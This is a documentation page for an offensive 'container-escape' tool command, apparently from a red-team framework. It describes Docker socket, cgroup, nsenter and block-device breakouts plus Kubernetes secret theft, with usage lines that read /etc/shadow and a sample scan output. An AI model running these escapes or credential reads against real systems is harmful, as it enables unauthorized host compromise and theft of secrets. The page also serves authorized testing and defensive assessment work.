+++
title = "container-escape"
chapter = false
weight = 100
hidden = false
+++

{{% notice info %}}Linux Only{{% /notice %}}

## Summary

Container escape and Kubernetes operations — enumerate and exploit breakout vectors for escaping Docker, Kubernetes, and other container runtimes. Includes K8s API operations for pod enumeration, secret access, pod deployment, and remote execution. Supports Docker socket abuse, cgroup release_agent, PID namespace nsenter, host block device mounting, and full K8s API interaction.

## Arguments

| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| action | No | check | Escape technique or K8s operation |
| command | No | — | Command to execute, secret name, or 'podname command' for k8s-exec |
| image | No | alpine | Container image for docker-sock/k8s-deploy/k8s-exec |
| path | No | auto-detect | Block device path for mount-host, or K8s namespace override |

### Actions

**Container Escape:**
- **check** — Enumerate all available escape vectors without exploiting them
- **docker-sock** — Exploit mounted Docker socket to run a privileged container with host filesystem access
- **cgroup** — Use cgroup release_agent to execute commands on the host (requires privileged container)
- **nsenter** — Enter host PID namespace via nsenter to run commands as host root
- **mount-host** — Mount host block device to read host filesystem (requires CAP_SYS_ADMIN)

**Kubernetes Operations (T1610, T1613, T1552.007):**
- **k8s-enum** — Discover K8s API server, enumerate namespaces, pods, and services
- **k8s-secrets** — List and read Kubernetes secrets (T1552.007). Use `-command <name>` to read a specific secret
- **k8s-deploy** — Create a pod with host filesystem mount and execute commands
- **k8s-exec** — Run a command in an existing pod's context via ephemeral pod with same service account

## Usage

```
container-escape
container-escape -action check
container-escape -action docker-sock -command "cat /etc/shadow"
container-escape -action nsenter -command "id && hostname"
container-escape -action mount-host -path /dev/sda1
```

### Example Output (check)

```
=== CONTAINER ESCAPE VECTOR CHECK ===

[!] Docker socket: /var/run/docker.sock (mode: srw-rw----) — WRITABLE
    Use: container-escape -action docker-sock -command '<cmd>'

[!] Full capabilities detected — likely PRIVILEGED container
[!] Cgroup path: /docker/abc123... — release_agent escape may be possible
    Use: container-escape -action cgroup -command '<cmd>'

[*] PID namespace: container=pid:[4026532198], host=pid:[4026531836] (isolated)
[!] Host block device accessible: /dev/sda
    Use: container-escape -action mount-host -path /dev/sda

[!] K8s service account token found: eyJhbGciOiJSUzI1NiIsImtpZCI6...
    Potential for K8s API abuse (pod creation, secret access)

=== 4 escape vector(s) identified ===
```

### Kubernetes Operations

```
# Enumerate pods, services, namespaces
container-escape -action k8s-enum

# Enumerate a specific namespace
container-escape -action k8s-enum -path kube-system

# List secrets in current namespace
container-escape -action k8s-secrets

# Read a specific secret
container-escape -action k8s-secrets -command my-secret-name

# Deploy a pod with host filesystem mount
container-escape -action k8s-deploy -command "cat /hostfs/etc/shadow" -image alpine

# Run a command in an existing pod's context
container-escape -action k8s-exec -command "nginx-pod-abc123 id"
```

K8s operations require a service account token (auto-detected from `/var/run/secrets/kubernetes.io/serviceaccount/`). All API calls use the service account's RBAC permissions. Use `k8s-enum` first to assess available access.

## MITRE ATT&CK Mapping

| Technique ID | Name |
|--------------|------|
| T1611 | Escape to Host |
| T1610 | Deploy Container |
| T1613 | Container and Resource Discovery |
| T1552.007 | Unsecured Credentials: Container API |
